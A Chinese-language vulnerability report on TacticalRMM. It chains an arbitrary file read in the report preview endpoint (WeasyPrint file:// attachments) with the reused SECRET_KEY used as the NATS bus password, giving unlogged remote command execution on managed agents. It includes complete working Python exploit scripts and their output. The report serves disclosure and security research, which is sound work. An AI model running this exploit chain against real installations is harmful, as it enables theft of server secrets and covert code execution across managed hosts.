# TacticalRMM 漏洞报告

软件名称：TacticalRMM

开发者或厂商：AmidaWare

代码仓库：https://github.com/amidaware/tacticalrmm

## 1. 报表预览接口任意文件读导致纳管主机RCE

简要描述：拥有报表管理权限的账号可通过报表预览接口读取服务器上的任意文件，并利用读到的 NATS 总线口令向全部纳管主机下发命令。

影响版本：0.17.0 ~ 1.6.1

前置条件：攻击者持有一个具备报表管理权限的账号。

### 漏洞成因

报表预览接口 `POST /reporting/templates/preview/` 接受用户提交的 `template_md`，渲染成 HTML 之后交给 WeasyPrint 生成 PDF。相关代码如下：

```python
# api/tacticalrmm/ee/reporting/views.py:225-245    commit 93d149fcda
    def post(self, request: Request) -> Union[FileResponse, Response]:
        try:
            serializer = self.InputSerializer(data=request.data)
            serializer.is_valid(raise_exception=True)
            report_data = serializer.validated_data

            html_report, variables = generate_html(
                template=report_data["template_md"],
                template_type=report_data["type"],
                css=report_data.get("template_css", ""),
                html_template=report_data.get("template_html"),
                variables=report_data["template_variables"],
                dependencies=report_data["dependencies"],
                user=request.user,
            )

            if report_data["debug"]:
                return self._process_debug_response(html_report, variables)
            return self._generate_response_based_on_format(
                html_report, report_data["format"]
            )
```

```python
# api/tacticalrmm/ee/reporting/utils.py:110-117    commit 93d149fcda
def generate_pdf(*, html: str, css: str = "") -> bytes:
    font_config = FontConfiguration()

    pdf_bytes: bytes = HTML(string=html).write_pdf(
        stylesheets=[CSS(string=css, font_config=font_config)], font_config=font_config
    )

    return pdf_bytes
```

WeasyPrint 会解析 `<link rel="attachment">` 并把 href 指向的资源作为附件嵌入 PDF，模板中写入 `file://` 路径即可读出服务器上的本地文件。生成的 PDF 由 `FileResponse` 直接返回给攻击者，于是攻击者可实现任意文件读。

接下来实现纳管主机 RCE。TacticalRMM 服务器上的 `/opt/tactical/api/nats-rmm.conf` 保存了 NATS 总线配置，其中 TRMM 账号的口令复用 Django 的 `SECRET_KEY`，相关代码如下：

```python
# api/tacticalrmm/tacticalrmm/utils.py:227-236    commit 93d149fcda
    accounts = {
        "TRMM": {
            "users": [
                {
                    "user": "tacticalrmm",
                    "password": settings.SECRET_KEY,
                    "permissions": {"publish": ">", "subscribe": ">"},
                }
            ],
            "mappings": {"*": "cmd.{{wildcard(1)}}"},
            "exports": [{"stream": "cmd.*"}],
```

该 `SECRET_KEY` 可从 `/opt/tactical/api/tacticalrmm/local_settings.py` 读出。

nginx 将 `/natsws` 反代到 NATS 的 websocket 端口。相关配置如下：

```nginx
# docker/containers/tactical-nginx/entrypoint.sh:122-124    commit 93d149fcda
    location ~ ^/natsws {
        set $natswebsocket http://${NATS_SERVICE}:9235;
        proxy_pass $natswebsocket;
```

故攻击者读出 `SECRET_KEY` 作为口令，以 `tacticalrmm` 身份连接 `wss://<API_HOST>/natsws`，即可向任意 `agent_id` 发布 `runscript`。该消息由总线投递给 agent，不经过 Django，于是既没有权限校验，也不会写入 `AgentHistory` 或 `AuditLog`。

### 复现环境搭建

实验环境用官方 compose 部署，操作如下：

```bash
git clone https://github.com/amidaware/tacticalrmm
cd tacticalrmm/docker
cp .env.example .env
# 按实际情况填写 APP_HOST、API_HOST、MESH_HOST 以及 TRMM_USER、TRMM_PASS
docker compose up -d
```

环境启动后，创建一个 client 与 site，创建一个只勾选 `can_manage_reports` 的角色并分配给演示账号，再在一台主机上安装 agent。本次复现在 1.6.1 版本上完成，agent 由 rmmagent 2.12.0 源码构建，运行在容器中。

### 复现过程

以演示账号登录，界面如下，该账号看不到任何 client 与 agent：

![](img/01-reporter-scope.png)

调用报表预览接口，把返回的 PDF 附件取出：

```python
import io
import json
import re

import httpx
from pypdf import PdfReader

API = "https://api.trmm.example.com"

token = httpx.post(f"{API}/v2/checkcreds/",
                   json={"username": "reporter", "password": "Reporter12345."},
                   verify=False).json()["token"]


def read_file(path):
    html = f'<html><body><link rel="attachment" href="file://{path}"></body></html>'
    resp = httpx.post(f"{API}/reporting/templates/preview/",
                      headers={"Authorization": f"Token {token}"},
                      json={"template_md": html, "type": "html",
                            "template_variables": "{}", "dependencies": {},
                            "format": "pdf"},
                      verify=False, timeout=60)
    attachment = list(PdfReader(io.BytesIO(resp.content)).attachments.values())[0]
    return attachment if isinstance(attachment, bytes) else b"".join(attachment)


settings = read_file("/opt/tactical/api/tacticalrmm/local_settings.py").decode()
print("SECRET_KEY =", re.search(r"SECRET_KEY = '([^']+)'", settings).group(1))

conf = json.loads(read_file("/opt/tactical/api/nats-rmm.conf"))
trmm = conf["accounts"]["TRMM"]
print("bus account:", trmm["users"][0]["user"])
print("permissions:", trmm["users"][0]["permissions"])
print("mappings   :", trmm["mappings"])
print("agents     :", [u["user"] for u in conf["accounts"]["AGENTS"]["users"]])
```

输出如下：

```
SECRET_KEY = Orj4XyFLsFMBrQqgOQYzBxj32qSlabB9rwdXJ1RLWbCndQuWeOoYVtCVwews7lgRYHcC85G3g3fzUDCw
bus account: tacticalrmm
permissions: {'publish': '>', 'subscribe': '>'}
mappings   : {'*': 'cmd.{{wildcard(1)}}'}
agents     : ['cbb7c8f580634ed29588d66bd48233dc']
```

接下来连接总线并向该主机下发命令：

```python
import asyncio
import ssl

import msgpack
import nats

SECRET_KEY = "Orj4XyFLsFMBrQqgOQYzBxj32qSlabB9rwdXJ1RLWbCndQuWeOoYVtCVwews7lgRYHcC85G3g3fzUDCw"
AGENTS = ["cbb7c8f580634ed29588d66bd48233dc"]
CODE = "#!/bin/bash\nid\nhostname\n"


async def main():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    nc = await nats.connect("wss://api.trmm.example.com/natsws",
                            user="tacticalrmm", password=SECRET_KEY,
                            tls=ctx, allow_reconnect=False)
    for agent_id in AGENTS:
        msg = {"func": "runscript",
               "payload": {"code": CODE, "shell": "bash"},
               "timeout": 20, "script_args": [], "env_vars": [], "id": 0}
        reply = await nc.request(agent_id, msgpack.dumps(msg), timeout=20)
        print(reply.data[3:].decode(errors="replace"))
    await nc.close()


asyncio.run(main())
```

命令在被纳管主机上执行，返回结果如下：

```
uid=1000 gid=1000 groups=1000
debian
```

本次命令通过总线直接下发，因此从 admin 视角看，该 agent 的 History 页面没有任何记录：

![](img/02-agent-history-empty.png)
